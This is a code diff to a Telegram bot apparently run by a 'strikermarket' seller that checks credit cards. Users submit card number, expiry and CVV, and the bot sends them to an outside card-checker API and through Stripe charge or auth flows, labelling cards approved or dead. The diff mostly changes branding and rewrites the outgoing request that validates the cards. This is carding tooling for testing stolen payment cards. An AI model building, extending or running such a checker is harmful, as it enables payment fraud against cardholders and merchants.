@@ -54,7 +54,7 @@ async def info(message: types.Message):
 async def helpstr(message: types.Message):
     await message.answer_chat_action("typing")
     await message.reply(
-        "<b>COMMANDS</b>\n\n<b>➣ Stripe Charge/Auth [✅]</b>\n<code>/chk cc|mm|yy|cvv</code>\n\n<b>➣ Check SK Key [✅]</b>\n<code>/key sk_live</code>\n\n<b>➣ Check Info [✅]</b>\n<code>/info</code>\n\n<b>➣ Check BIN Info [✅]</b>\n<code>/bin xxxxxx</code>\n\n<b>Contact → @strikerop95</b>\n<b>Bot By @strikermarket</b>"
+        "<b>COMMANDS</b>\n\n<b>➣ Stripe Charge/Auth [✅]</b>\n<code>/chk cc|mm|yy|cvv</code>\n\n<b>➣ Check Info [✅]</b>\n<code>/info</code>\n\n<b>➣ Check BIN Info [✅]</b>\n<code>/bin xxxxxx</code>\n\n<b>CONTACT → @strikerop95</b>\n<b>BOTBY:</b>➟ @strikermarket"
     )
 
                             
@@ -125,7 +125,7 @@ async def binio(message: types.Message):
 <b>BIN INFO</b>
 <code>{k.get_text()[62:]}</code>
 CheckedBy: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 ╘═════════
 """
     await message.reply(INFO)
@@ -152,27 +152,17 @@ async def ch(message: types.Message):
             "<b>BLACKLISTED BIN</b>"
             )
      
-    heads = {
-      "accept-encoding" : "gzip, deflate, br",
-      "accept-language" : "en-US,en;q=0.9",
-      "Accept": "application/json, text/plain, */*",
-      "Content-Type": "application/x-www-form-urlencoded",
-      "origin" : "https://www.mrchecker.net",
-      "referer" : "https://www.mrchecker.net/card-checker/ccn2/",
-      "Sec-Fetch-Dest": "empty",
-      "user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
-    }
-      
-    ad = requests.get("https://www.mrchecker.net/card-checker/ccn2/api.php/",
-                     data=cc, headers=heads)
+    staticData={"data" : cc, "accept-encoding" : "gzip, deflate, br", "accept-language" : "en-US,en;q=0.9", "origin" : "https://www.mrchecker.net", "referer" : "https://www.mrchecker.net/card-checker//ccn2/", "user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"}   
+    ad = requests.post(url="https://www.mrchecker.net/card-checker//ccn2/api.php", data=staticData)
     toc = time.perf_counter()
+    
     if "Live" in ad.text :
        await message.reply(f"""
 ✅<b>CC</b>➟ <code>{cc}</code>
 <b>STATUS</b>➟ #ApprovedCCN
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 """)
     elif "Die" in ad.text :
       await message.reply(f"""
@@ -180,7 +170,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ #DeadCCN
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 """)  
     elif "Unknown" in ad.text :
        await message.reply(f"""
@@ -188,7 +178,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ #Unknown
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 """)       
         
     
@@ -293,7 +283,7 @@ async def ch(message: types.Message):
 <b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 """)
     elif "Unrecognized request URL" in rx.text:
         await message.reply("[UPDATE] PROXIES ERROR")
@@ -303,7 +293,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ #ApprovedCVV
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 """)
     else:
         await message.reply(f"""
@@ -312,7 +302,7 @@ async def ch(message: types.Message):
 <b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-<b>Bot:</b> @strikermarket
+<b>BOTBY:</b>➟ @strikermarket
 """)  
     
     
